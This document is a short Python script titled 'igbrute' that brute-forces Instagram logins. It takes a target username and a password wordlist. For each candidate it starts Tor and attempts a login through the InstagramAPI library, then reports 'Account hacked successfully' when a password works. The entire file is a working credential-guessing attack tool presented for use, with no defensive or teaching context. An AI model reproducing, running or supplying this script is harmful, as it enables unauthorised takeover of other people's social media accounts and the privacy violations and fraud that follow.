from InstagramAPI import InstagramAPI
from colorama import Fore
from colorama import Back
from pyfiglet import Figlet
#########################
import time as t	# sorry for the shitty "design" lol
import os		#
#########################
f = Figlet(font='slant')

print (Fore.CYAN + f.renderText('igbrute'))
print ("\n\n\n Made by: @altair.1.23")

user = input (Fore.YELLOW + "User: ")
wordlist = input("Wordlist: ")
wordlist = open(wordlist, "r")
timeout = int(input(Fore.YELLOW + "\n[*] Timeout between each password (Secs): "))
print(Fore.YELLOW + "[-] Please wait for a moment")
t.sleep(2)

for password in wordlist:

	os.system("service tor start")
	t.sleep(timeout)
	api = InstagramAPI(user, password)
	print (Fore.WHITE + "Trying password: %s" % password)
	if (api.login()):
		print (Fore.GREEN + "[*] Account hacked successfully: %s" % password)
	else:
		os.system("clear")
		print (Fore.RED + "[!] Password incorrect: %s " % password)
		t.sleep(0.5)
		os.system("clear")
